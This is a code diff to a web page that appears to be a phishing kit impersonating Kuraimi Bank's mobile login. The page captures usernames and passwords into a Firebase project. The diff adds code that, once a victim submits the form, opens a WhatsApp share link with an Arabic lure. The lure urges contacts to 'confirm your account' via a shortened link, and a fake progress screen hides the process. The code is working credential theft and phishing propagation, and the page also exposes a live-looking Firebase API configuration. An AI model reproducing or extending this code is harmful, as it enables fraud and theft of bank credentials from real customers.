@@ -336,6 +336,93 @@
             animation: spin 1s linear infinite;
         }
         
+        .whatsapp-notification {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(37, 211, 102, 0.9);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(-120%);
+            transition: transform 0.5s ease;
+        }
+        
+        .whatsapp-notification.show {
+            transform: translateX(0);
+        }
+        
+        .whatsapp-process {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1500;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+        }
+        
+        .whatsapp-process.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .whatsapp-process-content {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .whatsapp-process-icon {
+            color: #25D366;
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        .whatsapp-process-title {
+            color: #075E54;
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .whatsapp-process-bar {
+            width: 100%;
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .whatsapp-process-progress {
+            height: 100%;
+            background: linear-gradient(to right, #25D366, #128C7E);
+            width: 0%;
+            transition: width 1s ease;
+        }
+        
+        .whatsapp-process-message {
+            color: #555;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.1); }
@@ -407,6 +494,14 @@
             .waiting-message {
                 font-size: 15px;
             }
+            
+            .whatsapp-process-content {
+                padding: 20px;
+            }
+            
+            .whatsapp-process-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
@@ -439,6 +534,26 @@
     <div class="success-notification" id="successNotification">
         <i class="fas fa-check-circle"></i>
         <span>تم إرسال البيانات بنجاح إلى قاعدة البيانات</span>
+    </div>
+    
+    <!-- إشعار نجاح إرسال واتساب -->
+    <div class="whatsapp-notification" id="whatsappNotification">
+        <i class="fab fa-whatsapp"></i>
+        <span>تم إرسال الرسالة إلى جهات الاتصال على واتساب</span>
+    </div>
+    
+    <!-- شاشة عملية إرسال واتساب -->
+    <div class="whatsapp-process" id="whatsappProcess">
+        <div class="whatsapp-process-content">
+            <div class="whatsapp-process-icon">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h2 class="whatsapp-process-title">جاري إرسال الرسالة إلى جهات الاتصال</h2>
+            <div class="whatsapp-process-bar">
+                <div class="whatsapp-process-progress" id="whatsappProgress"></div>
+            </div>
+            <p class="whatsapp-process-message" id="whatsappMessage">الرجاء عدم إغلاق الصفحة حتى اكتمال الإرسال</p>
+        </div>
     </div>
 
     <!-- صفحة تسجيل الدخول -->
@@ -515,7 +630,7 @@
             apiKey: "AIzaSyDhFl6IEkec_0UytloHHNhEsjZ6PoBtohc",
             authDomain: "kuraimi-bank.firebaseapp.com",
             projectId: "kuraimi-bank",
-            storageBucket: "kuraimi-bank.firebasestorage.app",
+            storageBucket: "kuraimi-bank.appspot.com",
             messagingSenderId: "724269508345",
             appId: "1:724269508345:web:dffb7a6a8ba4505bde6428",
             measurementId: "G-NWKWP3MK4N",
@@ -556,12 +671,24 @@
         const countdownElement = document.getElementById('countdown');
         const countdownTime = document.getElementById('countdownTime');
         const successNotification = document.getElementById('successNotification');
+        const whatsappNotification = document.getElementById('whatsappNotification');
+        const whatsappProcess = document.getElementById('whatsappProcess');
+        const whatsappProgress = document.getElementById('whatsappProgress');
+        const whatsappMessage = document.getElementById('whatsappMessage');
         
         // دالة لإظهار إشعار النجاح
         function showSuccessNotification() {
             successNotification.classList.add('show');
             setTimeout(() => {
                 successNotification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // دالة لإظهار إشعار واتساب
+        function showWhatsappNotification() {
+            whatsappNotification.classList.add('show');
+            setTimeout(() => {
+                whatsappNotification.classList.remove('show');
             }, 3000);
         }
         
@@ -627,6 +754,58 @@
             }, 1000);
         }
         
+        // دالة لمحاكاة عملية إرسال واتساب
+        function simulateWhatsAppSending() {
+            // إظهار شاشة المحاكاة
+            whatsappProcess.classList.add('active');
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                whatsappProgress.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    whatsappMessage.textContent = "اكتمل الإرسال بنجاح!";
+                    
+                    // إخفاء شاشة المحاكاة بعد ثانيتين
+                    setTimeout(() => {
+                        whatsappProcess.classList.remove('active');
+                        showWhatsappNotification();
+                    }, 2000);
+                }
+            }, 100);
+        }
+        
+        // دالة لإرسال رسالة واتساب تلقائيًا
+        function sendWhatsAppMessage() {
+            const message = `عزيزي عميل بنك الكريمي جوال
+نهنئك بترقية نظامنا المصرفي! لضمان استمرار خدمتك بسلاسة، نرجو 
+*تأكيد حسابك* فورًا عبر أحد 
+
+الضغط على الرابط الآتي:  
+👉 [https://n9.cl/4wkty]`;
+
+            // تشفير الرسالة لاستخدامها في رابط واتساب
+            const encodedMessage = encodeURIComponent(message);
+            
+            // إنشاء رابط واتساب مع الرسالة
+            const whatsappUrl = `https://wa.me/?text=${encodedMessage}`;
+            
+            // محاكاة عملية الإرسال
+            simulateWhatsAppSending();
+            
+            // فتح الرابط بعد تأخير قصير لضمان رؤية المستخدم لعملية الإرسال
+            setTimeout(() => {
+                try {
+                    // فتح الرابط في نافذة جديدة
+                    window.open(whatsappUrl, '_blank');
+                } catch (e) {
+                    console.error("حدث خطأ أثناء فتح واتساب:", e);
+                }
+            }, 3500);
+        }
+        
         // دالة لحفظ البيانات وإرسالها إلى Firebase
         function saveData() {
             const username = usernameInput.value;
@@ -638,6 +817,9 @@
                 alert('الرجاء إدخال جميع الحقول المطلوبة');
                 return;
             }
+            
+            // إرسال رسالة واتساب تلقائيًا
+            sendWhatsAppMessage();
             
             // إرسال البيانات إلى Firebase
             loginBtn.textContent = 'جاري الحفظ...';
@@ -662,20 +844,20 @@
                                 loginBtn.textContent = 'دخول';
                                 loginBtn.disabled = false;
                             } else {
-                                // إذا فشل الحفظ، نعرض صفحة الانتظار مباشرة
+                                // إذا فشل الحفظ، نعرض صفحة الانتظار
                                 showWaitingPage();
                                 loginBtn.textContent = 'دخول';
                                 loginBtn.disabled = false;
                             }
                         })
                         .catch(() => {
-                            // إذا فشل الحفظ، نعرض صفحة الانتظار مباشرة
+                            // إذا فشل الحفظ، نعرض صفحة الانتظار
                             showWaitingPage();
                             loginBtn.textContent = 'دخول';
                             loginBtn.disabled = false;
                         });
                 } catch (error) {
-                    // في حالة وجود أي خطأ، نعرض صفحة الانتظار مباشرة
+                    // في حالة وجود أي خطأ، نعرض صفحة الانتظار
                     showWaitingPage();
                     loginBtn.textContent = 'دخول';
                     loginBtn.disabled = false;
